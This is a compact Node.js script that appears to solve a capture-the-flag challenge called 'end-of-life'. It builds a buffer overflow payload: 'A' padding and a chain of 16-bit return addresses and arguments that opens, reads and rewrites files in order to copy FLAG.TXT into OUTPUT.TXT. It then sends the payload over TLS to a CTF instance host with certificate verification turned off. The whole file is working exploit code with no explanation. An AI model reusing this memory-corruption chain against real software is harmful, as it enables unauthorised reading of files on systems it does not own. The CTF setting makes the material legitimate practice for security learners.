const tls=require('tls');let p=Buffer.alloc(180,0x41);p[0]=0x61;p[1]=0x1a;p.write('FLAG.TXT',100);p[108]=0;let w=(i,v)=>p.writeUInt16LE(v,i);let i=20;
// open INPUT.TXT read-only -> fd5
w(i,0x1cf3);w(i+2,0x14a2);w(i+4,0xaa);w(i+6,0);w(i+8,0);i+=10;
// seek fd5 to offset100 from start; seek ret c3, cleanup add8
w(i,0x548);w(i+2,0xcf2);w(i+4,5);w(i+6,100);w(i+8,0);w(i+10,0);i+=12;
// read 9 bytes into DS:aa (overwrite input.txt with FLAG.TXT\0)
w(i,0x5ed);w(i+2,0x14a2);w(i+4,5);w(i+6,0xaa);w(i+8,9);i+=10;
// open FLAG.TXT now at DS:aa -> fd6
w(i,0x1cf3);w(i+2,0x14a2);w(i+4,0xaa);w(i+6,0);w(i+8,0);i+=10;
// open OUTPUT.TXT mode2 -> fd7
w(i,0x1cf3);w(i+2,0x14a2);w(i+4,0xc4);w(i+6,2);w(i+8,0);i+=10;
// read flag fd6 into 1000
w(i,0x5ed);w(i+2,0x14a2);w(i+4,6);w(i+6,0x1000);w(i+8,0x40);i+=10;
// write to output fd7
w(i,0x2366);w(i+2,0x14a2);w(i+4,7);w(i+6,0x1000);w(i+8,0x40);i+=10;
w(i,0x197);
let o='',d=0,s=tls.connect({host:'end-of-life-d224e204505e.inst20.ctf.fortid.com',port:1337,servername:'end-of-life-d224e204505e.inst20.ctf.fortid.com',rejectUnauthorized:false},()=>s.write(p.toString('base64')+'\n'));s.setEncoding('utf8');s.on('data',x=>o+=x);s.on('end',()=>{if(!d){d=1;console.log(o)}});setTimeout(()=>{if(!d){d=1;s.destroy();console.log('TIME '+o)}},11000)
